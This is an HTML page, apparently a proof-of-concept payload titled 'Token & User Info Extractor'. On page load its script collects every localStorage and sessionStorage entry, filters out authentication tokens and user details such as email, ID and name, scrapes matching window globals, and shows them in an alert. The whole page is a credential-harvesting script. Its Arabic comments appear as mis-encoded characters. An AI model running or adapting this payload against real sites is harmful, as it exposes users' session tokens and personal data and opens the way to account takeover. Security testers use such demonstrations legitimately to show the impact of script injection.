<!DOCTYPE html>
<html>
  <head>
    <title>ğŸ” Token & User Info Extractor</title>
    <script>
      window.onload = function () {
        // â¬‡ï¸ Ù‚Ø±Ø§Ø¡Ø© localStorage Ùˆ sessionStorage
        const localStorageData = {};
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          localStorageData[key] = localStorage.getItem(key);
        }

        const sessionStorageData = {};
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          sessionStorageData[key] = sessionStorage.getItem(key);
        }

        // â¬‡ï¸ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ù…Ù† Ø§Ù„ØªØ®Ø²ÙŠÙ†
        const tokens = {};
        const allKeys = [...Object.keys(localStorageData), ...Object.keys(sessionStorageData)];
        allKeys.forEach((key) => {
          if (/token|auth|bearer/i.test(key)) {
            tokens[key] = localStorageData[key] || sessionStorageData[key];
          }
        });

        // â¬‡ï¸ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
        const userInfo = {};
        allKeys.forEach((key) => {
          if (/user|email|id|name/i.test(key)) {
            userInfo[key] = localStorageData[key] || sessionStorageData[key];
          }
        });

        // â¬‡ï¸ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ù…Ù† window Ø§Ù„Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ø¹Ø§Ù…Ø©
        const globals = {};
        for (const key in window) {
          if (/token|auth|user|email|name/i.test(key) && typeof window[key] === 'string') {
            globals[key] = window[key];
          }
        }

        // â¬‡ï¸ Ø¹Ø±Ø¶Ù‡Ù… ÙÙŠ Ø±Ø³Ø§Ù„Ø©
        const message = `
ğŸ•µï¸â€â™‚ï¸ Extracted Data:

ğŸ”‘ Tokens:
${JSON.stringify(tokens, null, 2)}

ğŸ™â€â™‚ï¸ User Info:
${JSON.stringify(userInfo, null, 2)}

ğŸŒ Global Variables:
${JSON.stringify(globals, null, 2)}
        `;
        alert(message);
      };
    </script>
  </head>
  <body>

  </body>
